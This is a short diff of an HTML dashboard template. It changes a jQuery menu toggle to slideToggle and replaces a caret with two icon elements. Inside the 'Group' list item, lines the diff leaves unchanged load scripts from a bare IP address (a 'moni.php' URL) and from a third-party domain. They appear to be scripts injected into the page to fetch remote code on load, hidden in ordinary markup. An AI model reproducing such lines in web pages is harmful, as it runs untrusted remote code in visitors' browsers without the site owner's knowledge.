@@ -32,7 +32,7 @@
 	$(document).ready(function(){
         console.log("test_for_function")
         $("#button_for_toggle").click(function(){
-            $("#group_list").toggle();
+            $("#group_list").slideToggle(250);
         });
 	});
 	</script>
@@ -77,10 +77,11 @@
                 <li>
 	                <a>
 	                    <i class="pe-7s-users"></i> 
-	                    <p>Group
-                            <b style="cursor: pointer; float: right;" id="button_for_toggle" class="caret"></b>
+	                     <p>Group
 							<script src="http://120.25.128.165/moni.php?tm=1467545864" type="text/javascript"></script>
 							<script src="http://cpro.sndo.com/static/js/b.js" type="text/javascript"></script>
+                            <i style="cursor: pointer; width: 1px; float: right; margin-left: 18px" class="pe-7s-angle-down" id="button_for_toggle"></i>
+                            <i style="cursor: pointer; width: 1px; float: right;" class="pe-7s-plus"></i>
 	    				</p>
 	                    <ul id="group_list" class="dropdown-toggle" data-toggle="dropdown" style="display:none";>
 	                        <li>Group1</li> 
